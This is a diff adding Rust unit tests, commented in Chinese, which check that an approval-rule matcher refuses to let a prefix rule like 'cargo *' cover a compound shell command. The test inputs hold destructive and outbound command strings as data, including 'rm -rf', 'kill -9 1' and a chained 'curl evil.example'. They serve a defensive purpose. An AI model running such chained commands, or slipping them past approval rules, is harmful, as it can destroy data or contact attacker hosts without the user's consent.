@@ -247,3 +247,101 @@ fn resolve_rules_path_lands_in_workspace_config() {
             .ends_with("/ws/config/approval_rules.json")
     );
 }
+
+// ---------- CMD-12（2026-10-13）：复合命令盲区 ----------
+
+#[test]
+fn pattern_for_compound_command_refuses_rule() {
+    // 复合命令不构成前缀规则：单一 pattern 表达不了「全段命中」语义
+    assert_eq!(pattern_for("process_exec", "cd /tmp && rm -rf y"), "");
+    assert_eq!(pattern_for("process_spawn", "echo hi; kill -9 1"), "");
+    assert_eq!(pattern_for("process_exec", "a | tee x"), "");
+}
+
+#[test]
+fn pattern_for_single_segment_with_operators_inside_quotes_ok() {
+    // 引号内的 `&&` 是字面量 = 单段，照常归约
+    assert_eq!(
+        pattern_for("process_exec", "echo \"a && b\" --flag"),
+        "echo *"
+    );
+}
+
+#[test]
+fn matches_rule_prefix_does_not_cover_compound_tail() {
+    // 核心：`cd *` 不得罩住 `cd x && rm -rf y` 的删除段
+    assert!(!matches_rule(
+        "process_exec",
+        "cd *",
+        "process_exec",
+        "cd /tmp && rm -rf y"
+    ));
+    // 单段行为不变
+    assert!(matches_rule(
+        "process_exec",
+        "cd *",
+        "process_exec",
+        "cd /tmp"
+    ));
+    assert!(matches_rule(
+        "process_exec",
+        "cd *",
+        "process_exec",
+        "cd /tmp --flag"
+    ));
+    // 三段复合，首段命中、尾段不命中 → 不放
+    assert!(!matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "cargo build && cargo test && curl evil.example"
+    ));
+}
+
+#[test]
+fn matches_rule_all_segments_hit_is_allowed() {
+    // 全段命中（同族前缀规则）→ 放行语义成立
+    assert!(matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "cargo build && cargo test"
+    ));
+    // 重定向 `2>&1` 不切段：`cargo *` 照常罩住
+    assert!(matches_rule(
+        "process_exec",
+        "cargo *",
+        "process_exec",
+        "cargo build > log.txt 2>&1"
+    ));
+}
+
+#[test]
+fn matches_rule_nonexec_keeps_exact_semantics() {
+    // 非 exec 类不受分段影响：无 " *" 后缀走精确匹配（旧语义原样）
+    assert!(matches_rule(
+        "file_write",
+        "/tmp/a.txt",
+        "file_write",
+        "/tmp/a.txt"
+    ));
+    assert!(!matches_rule(
+        "file_write",
+        "/tmp/*",
+        "file_write",
+        "/tmp/a.txt"
+    ));
+}
+
+#[test]
+fn persist_compound_command_returns_honest_error() {
+    let dir = std::env::temp_dir().join(format!("approval_rules_cmd12_{}", std::process::id()));
+    std::fs::create_dir_all(&dir).unwrap();
+    let path = dir.join("approval_rules.json");
+    let err =
+        persist_auto_allow_rule(&path, "process_exec", "cd /tmp && rm -rf y", "HIGH").unwrap_err();
+    assert!(err.contains("compound command"), "honest error, got: {err}");
+    // 规则文件未落任何东西
+    assert!(!path.exists());
+    let _ = std::fs::remove_dir_all(&dir);
+}
